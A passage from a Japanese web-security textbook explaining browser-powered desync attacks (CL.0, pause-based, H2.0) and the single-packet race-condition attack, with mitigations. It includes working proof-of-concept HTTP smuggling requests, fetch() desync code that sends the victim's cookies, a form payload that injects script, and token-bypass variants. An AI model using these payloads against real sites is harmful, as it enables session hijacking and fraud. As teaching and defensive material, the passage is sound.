サーバ実装が「このエンドポイントにボディは来ない」と決めつけるケースは意外に多い。典型例は次のとおり。

- **静的ファイルの配信**（`/favicon.ico`、`.js`、`.css` など）：静的ファイルへの POST を想定していない実装は、CL を読まずにファイルを返し、ボディを読み捨てずに残す。
- **リダイレクトを返すエンドポイント**：301/302 を返すだけの処理系がボディを読まない。
- **エラーページ（404 など）**：エラー応答を即返してボディを無視する。
- **サーバレベルのリダイレクト（Apache の mod_alias 等）**。

これらはすべて「リクエストをステートレスに扱わず、ボディの読み捨てを怠っている」ことに起因する。RFC 上、たとえボディを使わないハンドラでも、CL 分のバイトはソケットから消費（読み捨て）しなければならないが、それを怠るとボディが次リクエスト扱いになる。

#### 検出手順（CSD ベクタの発見）

CSD を成立させる「CSD ベクタ」とは、**次の 2 条件を満たすリクエスト**である。

1. サーバがそのリクエストの `Content-Length` を無視する。
2. そのリクエストがブラウザのクロスドメイン `fetch()` で発火できる（＝禁止ヘッダに依存しない）。

まず、過大な CL を付けてサーバがボディを待たずに即応答するかを見る。

```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 5

X
```

ボディは `X`（1 バイト）しか送っていないのに `Content-Length: 5` を宣言している。**もしサーバが 5 バイト揃うのを待たずに即座に応答すれば、CL を無視している証拠**である（正常なサーバは残り 4 バイトを待ってタイムアウトするか、待機する）。

次に、1 本のコネクション上で 2 本のリクエストを続けて送り、1 本目のボディが 2 本目の応答に影響するかを確認する。Burp Suite なら「Send Group (single connection)」機能を使う。

```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 23

GET /404 HTTP/1.1
X: YGET / HTTP/1.1
Host: example.com
```

1 本目のボディに仕込んだ `GET /404 ...` がサーバに「別リクエスト」として解釈されれば、続く 2 本目の応答が `404` になる（本来 `/` は 200 のはず）。**1 本目のボディが 2 本目の応答を変えたら、そのサーバは脆弱**である。

> 出典: Browser-Powered Desync Attacks（PortSwigger Research, James Kettle, 2022） — https://portswigger.net/research/browser-powered-desync-attacks
> 出典: A Dive Into Client-Side Desync Attacks（Cobalt, Harsh Bothra） — https://www.cobalt.io/blog/a-dive-into-client-side-desync-attacks

---

### CSD をブラウザで実証する

検出できたら、実際のブラウザで `fetch()` を用いて再現する。原典の最小 PoC は次のとおり。

```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

各要素の意味を分解する。

- `method: 'POST'`＋`body: "GET /hopefully404 HTTP/1.1\r\nX: Y"`：ブラウザは自動で `Content-Length` を付けるが、脆弱なサーバはそれを無視する。ボディに埋め込んだ `GET /hopefully404 ...` が**密輸された 2 本目のリクエスト**として、サーバ側のソケットに「残る」。
- `credentials: 'include'`：被害者の Cookie を同送させる（セッションを絡めた攻撃のため）。
- `mode: 'no-cors'`（または `cors`）：CORS の応答本文は読めないが、**コネクションを汚染（poison）する目的では応答本文を読む必要はない**。重要なのは「汚染されたソケットを残す」ことである。
- `.then(() => { location = 'https://example.com/' })`：1 本目の完了後に**トップレベルナビゲーション**で同一オリジンに移動する。このナビゲーションは汚染済みコネクションを再利用する可能性が高く、被害者のブラウザが送る `GET /` が、サーバ側では「密輸済みの `GET /hopefully404` の続き」と結合されて処理される。

Chrome の Network タブで「2 本のリクエストが**同じ Connection ID**を持ち、2 本目が 404 になる」ことを確認できれば実証成功である。

Cobalt の解説では、CORS エラーを利用してリダイレクト追従を止める次のパターンも示されている。

```javascript
fetch('https://YOUR-LAB-ID.web-security-academy.net', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
    fetch('https://YOUR-LAB-ID.web-security-academy.net', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

`mode: 'cors'` にすると、サーバの応答に CORS ヘッダが無いため**意図的に CORS エラーが起き、`.catch()` が発火する**。この時点で 1 本目は完了し、コネクションは汚染済み。`catch` 内の 2 本目が汚染ソケットを再利用して密輸リクエストの続きになる。「エラーを利用して次の一手のタイミングを取る」のがポイントである。

> 出典: A Dive Into Client-Side Desync Attacks（Cobalt, Harsh Bothra） — https://www.cobalt.io/blog/a-dive-into-client-side-desync-attacks

---

### CSD の悪用パターン（防御理解のための整理）

原典は悪用を 3 系統に整理している。**本教科書は防御目的での理解のために概要を示す**（実在サービス・本番への無許可検証や破壊的手順は扱わない）。

1. **Store（保存）**：密輸リクエストで被害者の Cookie / 認証トークンを、サイト上の保存領域（コメント欄・買い物リスト等）に書き込ませて回収する。サーバサイド RS と同型。
2. **Chain & Pivot（連鎖・横展開）**：ブラウザが制御できない禁止ヘッダ（`User-Agent`、任意のカスタムヘッダ等）を密輸リクエストで注入し、CSD をサーバサイド攻撃（SQLi、Web キャッシュ汚染、内部ネットワークへの SSRF 等）に連鎖させる。
3. **Attack（直接攻撃）**：密輸したレスポンスに悪性の HTML/JavaScript を注入し、レスポンス分割で被害者のセッションを乗っ取る（XSS 相当）。

原典の最も重大な示唆は、**サーバ 1 台構成（フロントエンドなし）のサイトすら攻撃対象になる**点、そして CSD を足がかりに**イントラネットや IoT 機器**へ到達しうる点である。さらに、脆弱なサイト上の XSS ガジェットと組み合わせると**自己増殖する「デシンクワーム」**すら理論上可能（Amazon での PoC では認証トークンを買い物リストに保存する形が示された）。

#### 実サービスで示された手口の型（原理理解用）

原典では複数の製品・CDN での実例が示された。防御側が「どのようなエンドポイントが CSD ベクタになりやすいか」を理解するため、型だけを挙げる。

- **Akamai（静的アセットへの POST でリダイレクト時に CL 無視）**：`HEAD` メソッドを重ねて `Location` ヘッダに `<script>` を混ぜ込む「stacked HEAD」型。
- **Cisco WebVPN（静的ファイルへの POST で CL 無視）**：ブラウザのリソースキャッシュに汚染リダイレクトを保存させ、後からログインページが読み込むスクリプト（`/+CSCOE+/win.js` 等）を攻撃者サーバのものに差し替える「クライアントサイドキャッシュ汚染」型。
- **Verisign（`/%2f` への POST で発火）**：`Transfer-Encoding: chunked` と正確なサイズのチャンクを使い、後続のフォーム送信に `<svg/onload=...>` を注入する型。
- **Pulse Secure VPN（`/robots.txt` への POST で CL 無視）**：複数の汚染コネクションを作ってから、リソース読み込みのタイミング（約 120ms の待機、5ms の注入遅延）を突いてナビゲーションを汚染ソケットに乗せる「レース条件」型。

これらは共通して「**ボディが来ないと決めつけた特殊エンドポイント（静的ファイル、リダイレクト、`/%2f` などの変則パス）**」を CSD ベクタにしている。防御側は静的配信やリダイレクト処理のボディ読み捨てを疑うべき、というのが教訓である。

> 出典: Browser-Powered Desync Attacks（PortSwigger Research） — https://portswigger.net/research/browser-powered-desync-attacks

---

### connection-locked（接続ロック型）Request Smuggling

#### connection-state 攻撃：first-request routing / validation

サーバが誤って「1 本の（TLS）コネクション上の複数リクエストは同じ性質を共有する」と仮定すると、次の 2 つの脆弱性が生じる。

1. **First-request validation（初回リクエスト検証）**：プロキシが `Host` ヘッダなどの検証を**最初のリクエストにしか行わない**。攻撃者は「検証を通る正規の 1 本目」を送った後、同一コネクションの 2 本目で本来ブロックされるはずのバックエンド（内部ホストなど）へアクセスできる。
2. **First-request routing（初回リクエストルーティング）**：フロントエンドが**最初のリクエストの `Host` で選んだバックエンド接続に、以降のすべてのリクエストを流し込む**。攻撃者は 1 本目の `Host` を細工して、後続リクエストを別バックエンドに誘導できる。ホストヘッダ攻撃（パスワードリセットポイズニング等）に繋がる。

#### 「connection-locked」とは何か

通常の RS は、密輸したリクエストが**別の被害者のコネクション**に影響することで威力を持つ（他人のリクエストに前置プレフィックスを注入する）。ところが一部の環境では、密輸の効果が**同一コネクション内でしか観測できない**。これを **connection-locked（接続ロック型）** の RS と呼ぶ。

connection-locked の典型は「フロントエンドとバックエンドの間の TCP コネクションが**リクエストごと・クライアントごとに固定**されていて再利用されない」ケースである。この場合、攻撃者は「自分のコネクションに自分で密輸リクエストを流す」ことしかできず、一見無害に見える。しかし **CSD の観点では connection-locked でも十分に危険**である。なぜなら CSD では、そもそも「攻撃者が仕込んだ 1 本目」と「被害者ブラウザの 2 本目」が**同じブラウザ・同じコネクション上**に並ぶからだ。被害者自身のコネクションを汚染できれば、connection-locked という制約は問題にならない。

つまり、従来「connection-locked だから実害なし（他人に影響しない）」と片付けられていた RS が、**ブラウザ経由の CSD では実害あり**に転じる——これが本研究の重要な再評価点である。

> 出典: Browser-Powered Desync Attacks（PortSwigger Research） — https://portswigger.net/research/browser-powered-desync-attacks

---

### pause-based（一時停止ベース）デシンク

#### 仕組み：タイムアウト処理の実装ミスを突く

**pause-based デシンク**は、エンコーディングの曖昧さ（CL vs TE）ではなく、**サーバのタイムアウト処理のバグ**を突く。手順は次のとおり。

1. リクエストの**ヘッダ部までを送信**し、ボディの送信を意図的に一時停止する。
2. サーバが「部分リクエスト」に対して設定したタイムアウトに達すると、応答（例: タイムアウトエラーや部分応答）を返す。
3. ところが**バグのある実装はコネクションを閉じず、開いたまま残す**。しかもソケットに残った「まだ送っていないボディ」を読み捨てない。
4. タイムアウト後に**遅れてボディを送る**と、そのボディが**まったく新しいリクエスト**として解釈される。

つまり「タイムアウトしたのに接続を閉じず、部分データも破棄しない」実装ミスが、境界のズレ（デシンク）を生む。

#### 具体例

原典が挙げた実例。

- **Varnish**：部分リクエストに対して 15 秒のタイムアウト。ヘッダ＋（未達の）ボディ長宣言を送り、**16 秒待って**からボディを送ると、それが新規リクエストになる。
- **Apache**：サーバレベルのリダイレクトが部分リクエストをタイムアウトさせる際、コネクションを再利用可能な状態で残すため、遅延ボディが新規リクエストとして扱われる。

#### 検出の要点

pause-based を検出するには、**攻撃ツール側のタイムアウトが標的サーバのタイムアウトより長い**必要がある（さもないと、標的が応答する前にツールが諦めてしまう）。Turbo Intruder では以下のパラメータで一時停止を制御する。

- `pauseBefore`：一時停止するバイトオフセット
- `pauseMarker`：この文字列の直後で一時停止（文字列リスト）
- `pauseTime`：一時停止時間（マイクロ秒）

#### ブラウザ・MITM からの発火

pause-based の重要な帰結は、**攻撃者がプレーンテキストを覗けない「ブラインド MITM（中間者）」でも発火できる**点である。MITM は TLS を復号できなくても、**TCP パケットの到達を遅延させる**だけで一時停止を再現できる。原典では、フォーム送信でリクエストを OS が複数の TCP パケットに分割するようパディングを施し、`tc-NetEm` で 700〜1300 バイトのパケットを **61 秒以上**遅延させて Apache の pause-based タイムアウトを突く手法が示された。

```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?' + "h".repeat(600) + Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar" + "\r\n\r\n".repeat(1700) + "x"
form.appendChild(input)
document.body.appendChild(form)
form.submit()
```

`enctype='text/plain'` のフォームはボディに `name=value` をほぼ生のまま入れるため、`\r\n` を含む密輸リクエストを送れる。末尾の大量パディング（`"\r\n\r\n".repeat(1700)+"x"`）は、**OS がリクエストを複数 TCP パケットに分割する**ように仕向けるためのもので、MITM が特定サイズのパケットだけを遅延させられるようにしている。

> 出典: Browser-Powered Desync Attacks（PortSwigger Research） — https://portswigger.net/research/browser-powered-desync-attacks

---

### 関連手法：H2.0 デシンク（HTTP/2 ダウングレード）

CSD の必須条件は「標的が HTTP/1.1」だが、研究では **HTTP/2 フロントエンド → HTTP/1.1 バックエンド**のダウングレード時に生じる **H2.0 デシンク**も扱われた。HTTP/2 リクエストに `Content-Length` が無い状態でダウングレードされると、フロントエンド（例: Amazon ALB）が**誤って `Transfer-Encoding: chunked` を付与**してしまい、境界の曖昧さが生まれる。

```
:method: POST
:path: /b/
:authority: redacted
Content-Length: [省略]

GET /404 HTTP/1.1
X: X
```

HTTP/2 側では長さが明示されるため一見安全だが、**ダウングレード変換がヘッダを追加してセマンティクスを壊す**ため脆弱になる。「HTTP/2 を末端まで（end-to-end）貫く」ことが根本対策になる理由がここにある。

---

### 早期読み取り（early-read）による真偽判定

RS のテストで悩ましいのは、「本当に脆弱」なのか「単なる無害な HTTP パイプライン」なのかの区別である。原典は **early-read** テクニックを示した。CL.TE リクエストのチャンク終端（`0\r\n\r\n`）を送った直後に一時停止し、読み取りを試みる。

- **即座に応答が返る** → フロントエンドは CL を使っている（＝境界を誤解している＝**脆弱**）。
- **タイムアウトする** → フロントエンドは TE を使っている（＝正しく最後まで待つ＝**安全**）。

これにより、真の脆弱性と「単にパイプラインされただけ」を区別できる。

---

### 防御策（まとめ）

原典が提示する対策を、原理と対応づけて整理する。

1. **HTTP/2 を末端まで使う**：HTTP/2 はフレーム長が明示されるため、CL/TE の曖昧さ由来のデシンクが原理的に起きにくい。**HTTP/2 フロント → HTTP/1 バック**の変換を避ける。
2. **フォワードプロキシでも上流 HTTP/2 を有効化**：プロキシ起因の CSD を防ぐ。
3. **独自 HTTP サーバ実装を避ける**：HTTP/1 を完全に正しく実装するか、検証済みライブラリを使う。自前実装するなら、
   - リクエストを**独立した実体**として扱い、コネクション状態を仮定しない（first-request routing/validation の禁止）。
   - チャンク転送を**完全にサポートする**か、拒否したうえで**コネクションをリセット**する。
   - 「ボディは来ない」と決して仮定しない（CL.0 の根絶）。
   - サーバレベルの例外時は**既定でコネクションを閉じる**。
   - HTTP/2 をサポートする。
4. **堅牢なタイムアウト処理**：部分リクエストは**破棄してコネクションを閉じる**。ソケットに部分データを残さない（pause-based の根絶）。
5. **Content-Length の厳格な検証**：ボディを期待するリクエストでは常に CL を尊重し、実際のボディ長と突き合わせる。CL と TE が同時に来て一致しない場合はブロックする。

#### なぜこれらの攻撃が成立するのか（総括）

原典が挙げる「成立理由」を再掲する。教科書の核心はここにある。

1. **ブラウザ準拠の仮定**：サーバは「ブラウザは HTTP 仕様とコネクション性質に従う」と仮定するが、攻撃者はその仮定を破る。
2. **HTTP/1.1 の平文性**：暗号的なフレーミングが無く、サーバは CL/TE の曖昧さ検出に頼るしかない。
3. **コネクション再利用への過信**：暗号的な束縛が無いのに、複数リクエスト間のコネクション状態を信頼する。
4. **タイムアウト実装の誤り**：部分データを破棄せずにコネクションを閉じる、という基本を怠る。
5. **ダウングレードの脆弱性**：HTTP/2 → HTTP/1.1 変換がヘッダを追加してセマンティクスを壊す。
6. **ブラウザのキャッシュ分割の抜け穴**：トップレベルナビゲーションと `fetch()` で異なるキャッシュ／コネクションプールが使われることを悪用できる。
7. **リソース読み込みのレース条件**：ブラウザのリソース取得タイミングを遅延やコネクション制御で操作できる。

> 出典: Browser-Powered Desync Attacks（PortSwigger Research, James Kettle, 2022） — https://portswigger.net/research/browser-powered-desync-attacks
> 出典: A Dive Into Client-Side Desync Attacks（Cobalt, Harsh Bothra） — https://www.cobalt.io/blog/a-dive-into-client-side-desync-attacks

---

### この節の要点

- **CSD（クライアントサイドデシンク）**は、被害者のブラウザに「CL を無視するサーバへの `fetch()`」を送らせ、被害者自身のコネクションを汚染する。専用ツール不要・サーバ 1 台構成でも成立しうる点が革命的だった。
- **CL.0** は「サーバがボディを来ないと決めつけて CL を無視し、ボディを次リクエストと解釈する」バグ。仕様準拠の正常 HTTP で発火できるため、ブラウザから送れる。
- **connection-locked** な RS は従来「他人に影響しないから無害」とされたが、CSD では被害者自身のコネクションを汚染するため実害に転じる。
- **pause-based** はエンコーディングではなくタイムアウト処理のミスを突き、ブラインド MITM（TLS 復号不要のパケット遅延）でも発火できる。
- 根本対策は **HTTP/2 の末端貫通**、**独自 HTTP 実装の回避**、**堅牢なタイムアウトと CL 検証**である。

## (d) Smashing the State Machine（2023、single-packet attack / race condition）

James Kettle が DEF CON 31（2023年8月）と同名のホワイトペーパーで発表した研究。ここまでの章で扱ってきた HTTP リクエストスマグリング（フロントエンドとバックエンドのリクエスト境界の解釈差を突く攻撃）とは対象が異なり、テーマは **Web の競合状態（race condition）** である。ただし両者は「HTTP/2 のフレームを TCP パケット単位で精密に制御する」という低レイヤ技術を共有しており、リクエストスマグリング研究の延長線上に位置づけられる。この研究の中核となる **single-packet attack（シングルパケット攻撃）** は、複数のリクエストを1つの TCP パケットに詰めて「同時到着」を実現する手法で、後続のスマグリング・タイミング研究にも影響を与えた。

本節は防御目的の解説であり、実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。原理とテスト観点を理解し、自前の検証環境や責任ある開示の範囲で活用することを前提とする。

### なぜ競合状態が「マルチステップ」問題なのか

競合状態（race condition）とは、複数の並行リクエストが「セキュリティチェック」と「保護された処理（状態変更）」の間にできるわずかな時間の隙間を突くことで発生する脆弱性である。ほとんどの Web サイトは並行リクエストを複数スレッドで処理し、それらが単一の共有データベースを読み書きする。この構造上、次のような典型コードが穴になる。

```
if (i < limit):   # チェック
    i++           # ここまでの間に別スレッドが割り込むと…
    do_action()   # 保護された処理
```

チェックとインクリメントの間に別のリクエストが同じ `i` を読むと、両方とも「limit 未満」と判定して処理を通してしまう。これが古典的な **limit-overrun（上限超過）** である。ギフトカードの多重換金、割引コードの二重適用、残高を超える送金、CAPTCHA 解答の使い回し、レートリミット回避などがこのクラスに当たる。

Kettle の主張の核は「**with race conditions, everything is multi-step**（競合状態においては、あらゆる処理が実はマルチステップである）」という一文に凝縮される。単一リクエストの処理は、外からは1ステップに見えても、内部ではデータベースへの複数回の読み書き、別スレッドへのメール送信の切り出しなど、複数の中間状態を経る。この処理途中にだけ約1ミリ秒ほど存在する一時的な状態を **sub-state（サブステート＝表からは見えない過渡的な内部状態）** と呼び、それが露出している時間帯を **race window（レースウィンドウ）** と呼ぶ。従来の攻撃はこの ~1ms の窓を狙えるほど正確に「同時」を作れなかったため、多くの競合状態が見逃されてきた。

> 出典: Smashing the State Machine — https://portswigger.net/research/smashing-the-state-machine

### single-packet attack：ネットワークジッタを消す

競合状態攻撃の最大の敵は **ネットワークジッタ**（1つ1つのパケットが到着するタイミングのばらつき）である。20個のリクエストを送っても、経路の揺らぎで数ミリ秒ずつずれて到着すれば、~1ms のレースウィンドウには入らない。従来の到達点は **last-byte sync（ラストバイト同期）** で、全リクエストの最後の1バイトだけを保留しておき、最後にまとめて送る手法だった。それでも到着のばらつき（median spread）は 4ms、標準偏差 3ms 残る。

single-packet attack のアイデアは単純明快で、**20〜30個の HTTP/2 リクエストを1つの TCP パケットに収めてしまえば、ネットワークジッタとは無関係にサーバへ同時到着する**、というものである。TCP パケットはカーネルが分割せずまとめて上位層へ渡すため、パケット内のフレームは事実上同時に処理キューへ乗る。これにより「リモートのレースをローカルのレースに変える（makes remote races local）」ことができる。

HTTP/1.1 は1コネクションで逐次的にしかリクエストを送れないが、**HTTP/2 は多重化（multiplexing）** により1コネクション上で複数のリクエストストリームを同時に扱えるため、この手法は HTTP/2 を前提とする。1500バイトの標準的な TCP パケットに、ヘッダを含む複数の小さな HTTP/2 フレームを収めるわけである。

原典が示す「レシピ」は次の通り。

```
disable TCP_NODELAY   // OS にパケットをバッファさせる（Nagle アルゴリズムを有効化）
for each request with no body:
    send the headers
    withhold an empty data frame   // END_STREAM を持つ空データフレームを保留
    // 一部のサーバは content-length バイトを受け取った時点で早期処理するため
for each request with a body:
    send the headers, and the body except the final byte   // 本体は最後の1バイトを残す
    withhold a data frame containing the final byte
wait for 100ms
send a ping frame   // 遅延後の最初のフレームは OS がバッファしないため、まず ping を送る
send the final frames   // 保留した全フレームを1パケットで送る
// リファレンス実装: https://github.com/PortSwigger/turbo-intruder
```

**なぜこの手順になるのか** を仕組みレベルで説明する。

- **`TCP_NODELAY` を無効化する（＝ Nagle アルゴリズムを有効にする）**：通常のツールは低遅延のため `TCP_NODELAY` を立てて即時送信するが、ここではあえて OS に送信を溜め込ませたい。Nagle が有効だと、OS は小さな送信データをまとめて1パケットにコアレス（coalesce＝結合）する。これで「最後の複数フレームを1パケットに束ねる」ことがアプリ側でパケットを組まなくても実現できる。
- **本体の最後の1バイト（またはボディなしなら空の END_STREAM データフレーム）を保留する**：HTTP/2 サーバは、リクエストが「完結した」と分かって初めて処理を始める。完結の合図は END_STREAM フラグである。ヘッダやボディの大半を先に送っておき、最後の“引き金”フレームだけを保留すれば、全リクエストを「あと1バイトで走り出す」状態に揃えられる。一部サーバは content-length 分のバイトを受け取ると早期に処理を開始するため、ボディありのリクエストでは「最後の1バイト」を保留する必要がある。
- **100ms 待ってから ping フレームを送る**：遅延の後に送る最初のフレームは OS がバッファせず即送信してしまいがちなので、まず捨てフレーム（ping）を送って“最初の1発”の役目を吸収させ、続く本命フレーム群が確実に1パケットへ束ねられるようにする。

#### ベンチマーク結果

Kettle はメルボルン（豪）からダブリン（アイルランド）まで約17,000km 離れたサーバへ20リクエストを送って測定した。

| 手法 | Median spread（到着ばらつき中央値） | 標準偏差 |
| --- | --- | --- |
| Last-byte sync | 4ms | 3ms |
| **Single-packet attack** | **1ms** | **0.3ms** |

single-packet attack は last-byte sync の **4〜10倍精密** で、従来なら「2時間以上の試行」を要した攻撃が「30秒」で成立するようになった。距離17,000kmという不利な条件でも1msの同時性を達成できる点が本質的な進歩である。1パケットに詰められるのは概ね **20〜30リクエスト** が上限で、これは TCP のパケットサイズ制約に由来する。

> 出典: Smashing the State Machine — https://portswigger.net/research/smashing-the-state-machine

> ⚠️ **未取得の資料**: 「Web Race Conditions ホワイトペーパー PDF（racewhitepaper.pdf）」はバイナリPDFのため自動でのテキスト整形抽出が一部制限されましたが、WebFetch 経由で本文の技術要約は取得できています（HTTP/2 多重化、TCP パケットコアレシング、connection warming、Predict-Probe-Prove 手法、原子性による防御など）。原文の図表・完全なコード片を確認したい場合は次のURLから直接ご覧ください: https://portswigger.net/kb/papers/rifmwla/racewhitepaper.pdf

### 方法論：Predict / Probe / Prove

原典は競合状態探索の手順を3段階に整理している。

#### 1. Predict（衝突を予測する）
セキュリティ制御を持つ **ステートフルなオブジェクト**（ユーザー、セッション、注文など）を洗い出し、それらに読み書きするエンドポイントを地図化する。次の観点で絞り込む。

- 状態はサーバ側に永続化されるか。
- そのエンドポイントはデータを **編集（edit）** するか **追記（append）** するか（例：パスワードリセットは以前のリセットリンクを無効化するか）。
- 操作はどのデータベースキーを使うか。自分の複数リクエストは同じレコードに作用するか。

#### 2. Probe（手がかりを探る）
矛盾するリクエストを混ぜた「カオスな束（chaotic blend）」を作る。まず **逐次（in sequence）** で送って期待挙動をベンチマークし、次に **並列（in parallel、single-packet attack）** で送って、レスポンス内容・処理時間・送信メール・副作用などに **異常（anomaly）** が出ないか観察する。異常が出なければタイミングを微調整して実行スプレッドをさらに詰める。

補足として、single-packet attack は静的ファイルに対しては「負の応答タイムスタンプ」を生む（サーバが早期に応答を返すため）。これは対象がどの種類のエンドポイントかを識別する手がかりになる。

#### 3. Prove（概念実証まで持っていく）
余計なリクエストを削り、タイミングを調整し、リトライを自動化する。脆弱性を「構造的な弱点」と捉え、最初の1つで満足せず、連鎖や派生（chains & variations）を探す。

> 出典: DEF CON 31 — Smashing the state machine（スライド）— https://media.defcon.org/DEF%20CON%2031/

### ケーススタディで見る4つの衝突パターン

#### limit-overrun によるオブジェクトマスキング
招待 API に同一メールへの招待を6件同時送信すると、本来1件しか成功しないはずが複数のサブステートが並走し、想定外の状態（メンバー削除の成功メッセージなど）を引き出せた。上限チェックの原子性欠如を突く典型例。

#### multi-endpoint collision（複数エンドポイント衝突）
複数の別々のエンドポイントが同じ共有リソースを操作する場合の衝突。GitLab のメール確認機能が例。ここで難しいのは **内部レイテンシ（internal latency）** の扱いで、片方のエンドポイントが遅く片方が速いと、同時到着させても内部処理のタイミングがずれる。対策として、遅い側を先に投げてから約 **90ms** の遅延を挟んで速い側を投げるなど、クライアント側で意図的にディレイを入れて内部処理のタイミングを揃える。

#### single-endpoint collision（単一エンドポイント衝突）— Devise / GitLab（CVE-2022-4037）
1つの複雑なエンドポイントが自分自身の中で衝突を起こすケース。Rails で最も普及する認証ライブラリ **Devise** のメール確認処理が典型。原典が示すコード解析はこうだ。

```ruby
self.unconfirmed_email = self.email        # 'email' パラメータから
self.confirmation_token = @raw_confirmation_token = Devise.friendly_token
# 別スレッドを起こしてメールをレンダリング・送信する（ヒント1）
send_devise_notification(:confirmation_instructions,
                         @raw_confirmation_token,
                         { to: unconfirmed_email })
```

```haml
-# テンプレートエンジンは変数をデータベースから読み戻す
- confirmation_link = confirmation_url(confirmation_token: @token)
= email_default_heading(@resource.unconfirmed_email)   # ヒント2
= link_to _('Confirm your email address'), confirmation_link
```

**なぜ脆弱か**：メールの宛先（`to: unconfirmed_email`）はメソッド呼び出し時の値だが、メール本文の確認リンクとヘッダはテンプレートエンジンが **データベースから読み戻す**。この「送信時の値」と「本文レンダリング時にDBから読む値」の間にレースウィンドウがある。攻撃者が異なる2つのメールアドレス（x1, x2）への変更を同時送信すると、宛先は x2 なのに本文の確認情報が x1 のもの、という食い違いが起きる。

```
POST /-/profile HTTP/2
user[email]=x2@psres.net
---
GET /users/conf?token=vsz… HTTP/2
```

結果、あるアドレス宛の確認トークンが別アドレスで有効になり、招待の乗っ取り（Attack #1: Invitation hijack）や「Sign in with GitLab」の悪用（Attack #2）を通じてアカウント乗っ取りへ至った。GitLab は **2023年1月4日に 15.7.2 で修正**。Devise 本体は `/users/confirmation` から容易に検出可能なまま、報告後200日以上パッチが出ていない（発表時点）と指摘された。

#### deferred collision（遅延衝突）
即時処理ではなく背景のバッチ処理で顕在化するレース。メール変更を2アドレスへ送ると、約 **20分後** に両方の確認メールが同じ（誤った）宛先へ届く、といった二次的な兆候として現れる。この場合「タイミングは無関係になり、代わりに **量（volume）** が重要」になる。第二次的な手がかり（second-order clues）が極めて価値を持つ。

> 出典: DEF CON 31 — Smashing the state machine（スライド）— https://media.defcon.org/DEF%20CON%2031/

### さらなる研究：partial construction attack（部分構築攻撃）

オブジェクト生成そのものにレースウィンドウが潜む場合がある。

```
datastore.set(sessionid, 'user', user)
datastore.set(sessionid, 'token', rand(32))
```

`user` は設定済みだが `token` がまだ設定されていない一瞬の状態（部分的に構築されたオブジェクト）を突く。成立要件は2つ。**(1)** 未初期化の値・状態が例外を起こさないこと、**(2)** 攻撃者が「一致する値」を供給できること。特に token が未設定（null / 空）のときに、攻撃者が空トークンを送って一致させられるかが鍵になる。原典は次のようなペイロード変種を試すことを示す。

```
（token パラメータなし） / token / token= / token=null / token[] / {"token":null}
```

これらは「サーバ内部の未初期化値（例えば null や空文字）」に外から一致させるための総当たりのバリエーションである。

### 防御：データストアの一貫性メカニズムを知る

原典は、セッションハンドラやデータストアの一貫性モデルを3つに分類する。これを理解することが防御の出発点になる。

- **Locking（ロック）**：PHP のネイティブセッション、DB トランザクションで見られる。同一セッション/レコードへのアクセスを直列化するため、他レイヤのレースも覆い隠す。PHP はデフォルトで sessionid ごとにロックし、セッション単位の逐次処理を提供する。
- **Batching（バッチ）**：主要なセッションハンドラや ORM の多くが該当。レコード全体を読み込んでキャッシュし、リクエスト末尾にまとめて書き戻す。**単一リクエスト内では一貫している**が、**並列リクエスト間や背景スレッドとの間では不整合**になり得る。
- **No defence（防御なし）**：生のデータベースやカスタムセッションハンドラ。リクエストのライフサイクル中ですら一貫性が保証されない。

セッションハンドラに防御がない場合の危険例（原典）：

```
# コードベースのパスワードリセットのバイパス
session['reset_username'] = username
session['reset_code'] = randomCode()
# 攻撃：victim と attacker のリセットを同期させ、コードとユーザー名を取り違えさせる

# 2FA のバイパス
session['user'] = username
if 2fa_enabled:
    session['require2fa'] = true
# 攻撃：ログインと機微ページ取得を同期させ、require2fa 設定前に通過する

# セッションスワップ
session['user'] = username
set_auth_cookies_for(session['user'])
# 攻撃：被害者にセッションクッキーを固定し、その後ログインを同期させる
```

**恒久的な防御策**は次の通り。

- **sub-state を作らない**：状態変更を1つの処理単位に閉じる。
- **データソースを混在させない**：Devise の例のように「送信時の変数」と「後からDBを読み戻す値」を混ぜない。credential も配送先も同一のストレージから読む。
- **データストアの一貫性機能を使う**：トランザクション、原子的操作（atomic operations）、DB 層での一意性制約（uniqueness constraints）。
- **自分が使うセッションハンドラの一貫性モデルを把握する**（Locking / Batching / No defence のどれか）。
- サーバ側状態を持たない設計（JWT 等のクライアント側での状態保持）も、条件次第でサブステート露出を減らす選択肢になる。

### ツールと再現環境

リファレンス実装は **Turbo Intruder**（Burp Suite 拡張）に含まれ、`single-packet-attack` / `multi-endpoint` / `email-extraction` / `benchmark` などのテンプレートが用意されている。Burp Suite の Repeater でも「グループ送信（parallel）」で single-packet attack を使える。PortSwigger の Web Security Academy には limit-overrun / rate-limit bypass / multi-endpoint / single-endpoint / partial-construction の練習ラボがある（本教科書ではラボ攻略手順は扱わない）。これらはいずれも自前の学習環境で原理を確認するためのものである。

- Turbo Intruder: https://github.com/PortSwigger/turbo-intruder

### まとめ

- single-packet attack は、20〜30個の HTTP/2 リクエストを1つの TCP パケットに束ねて同時到着させ、ネットワークジッタを排除する手法。last-byte sync より 4〜10倍精密（同時性 1ms、標準偏差 0.3ms）で、「リモートのレースをローカルのレースに変える」。
- 鍵は HTTP/2 の多重化、END_STREAM フレームの保留、Nagle（TCP_NODELAY 無効化）による OS のパケットコアレシング、ping フレームによる先頭フレームの吸収。
- 「あらゆる処理はマルチステップ」であり、~1ms のサブステートを狙えるようになったことで、limit-overrun / multi-endpoint / single-endpoint / deferred / partial-construction という広いクラスの競合状態が現実的な脅威になった。
- 探索は **Predict → Probe → Prove**。防御は原子性・データソース非混在・一貫性制約、そして自分のセッションハンドラの一貫性モデルの把握。

> 出典: Smashing the State Machine — https://portswigger.net/research/smashing-the-state-machine
> 出典: DEF CON 31『Smashing the state machine: the true potential of web race conditions』スライド — https://media.defcon.org/DEF%20CON%2031/
